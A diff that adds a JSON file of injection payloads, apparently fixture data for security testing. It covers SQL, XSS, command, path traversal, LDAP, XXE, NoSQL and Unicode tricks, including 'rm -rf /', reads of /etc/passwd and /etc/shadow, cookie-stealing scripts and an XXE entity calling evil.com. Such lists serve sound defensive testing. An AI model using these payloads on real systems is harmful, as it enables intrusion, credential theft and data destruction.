@@ -1,0 +1,161 @@
+{
+  "sql_injection": {
+    "basic_attacks": [
+      "' OR '1'='1",
+      "' OR '1'='1' --",
+      "' OR '1'='1' /*",
+      "admin'--",
+      "admin' #",
+      "admin'/*",
+      "' or 1=1--",
+      "' or 1=1#",
+      "' or 1=1/*",
+      "') or '1'='1--",
+      "') or ('1'='1--"
+    ],
+    "union_attacks": [
+      "' UNION SELECT * FROM users--",
+      "' UNION SELECT NULL--",
+      "' UNION SELECT username, password FROM users--",
+      "' UNION ALL SELECT * FROM sensitive_data--"
+    ],
+    "blind_injection": [
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' AND SLEEP(5)--",
+      "' AND (SELECT COUNT(*) FROM users) > 0--"
+    ],
+    "second_order": [
+      "admin'||'",
+      "admin' + '",
+      "CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110)"
+    ],
+    "no_space_variants": [
+      "'or'1'='1",
+      "'or\"1\"=\"1",
+      "'or`1`=`1",
+      "admin'or'1'='1",
+      "'OR'1'='1"
+    ]
+  },
+  "xss_attacks": {
+    "basic_scripts": [
+      "<script>alert('XSS')</script>",
+      "<script>alert(document.cookie)</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "<iframe src='javascript:alert(\"XSS\")'>"
+    ],
+    "encoded_attacks": [
+      "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+      "%3Cscript%3Ealert('XSS')%3C/script%3E",
+      "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
+      "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e"
+    ],
+    "event_handlers": [
+      "<body onload=alert('XSS')>",
+      "<div onmouseover='alert(1)'>",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<select onfocus=alert(1)></select>"
+    ],
+    "javascript_protocols": [
+      "javascript:alert('XSS')",
+      "javascript:void(alert('XSS'))",
+      "javascript:confirm('XSS')",
+      "javascript:prompt('XSS')"
+    ],
+    "polyglot": [
+      "jaVasCript:/*-/*`/*\\`/*'/*\\\"/**/(/\\**/oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+    ]
+  },
+  "command_injection": {
+    "basic_commands": [
+      "; ls -la",
+      "; cat /etc/passwd",
+      "; rm -rf /",
+      "| whoami",
+      "|| whoami",
+      "& whoami",
+      "&& whoami"
+    ],
+    "encoded_commands": [
+      "%3B%20ls%20-la",
+      "%7C%20whoami",
+      "%26%26%20whoami"
+    ],
+    "backticks": [
+      "`whoami`",
+      "$(whoami)",
+      "$(/bin/ls)"
+    ],
+    "newline_injection": [
+      "\\n/bin/ls",
+      "\\r\\n/bin/cat /etc/passwd",
+      "%0a/bin/ls",
+      "%0d%0a/bin/ls"
+    ]
+  },
+  "path_traversal": {
+    "basic_traversal": [
+      "../../../etc/passwd",
+      "../../etc/shadow",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "....//....//....//etc/passwd"
+    ],
+    "encoded_traversal": [
+      "..%2F..%2F..%2Fetc%2Fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    ],
+    "absolute_paths": [
+      "/etc/passwd",
+      "C:\\windows\\system32\\config\\sam",
+      "file:///etc/passwd"
+    ],
+    "null_byte": [
+      "../../../../etc/passwd%00.jpg",
+      "../../../../etc/passwd\\x00.jpg"
+    ]
+  },
+  "ldap_injection": {
+    "basic_attacks": [
+      "*)(uid=*",
+      "*)(|(uid=*",
+      "admin)(|(password=*",
+      "*)(mail=*))%00"
+    ]
+  },
+  "xml_injection": {
+    "xxe_attacks": [
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]>"
+    ]
+  },
+  "nosql_injection": {
+    "mongodb_attacks": [
+      "{'$gt': ''}",
+      "{'$ne': null}",
+      "{'$where': 'this.password.length > 0'}",
+      "{'$regex': '.*'}"
+    ]
+  },
+  "special_characters": {
+    "null_bytes": [
+      "admin\\x00",
+      "user\\0",
+      "test%00"
+    ],
+    "unicode_tricks": [
+      "ａｄｍｉｎ",
+      "\\u0061\\u0064\\u006d\\u0069\\u006e",
+      "àdmin",
+      "аdmin"
+    ],
+    "zero_width": [
+      "ad\\u200Bmin",
+      "us\\u200Cer",
+      "ro\\u200Dle"
+    ]
+  }
+}
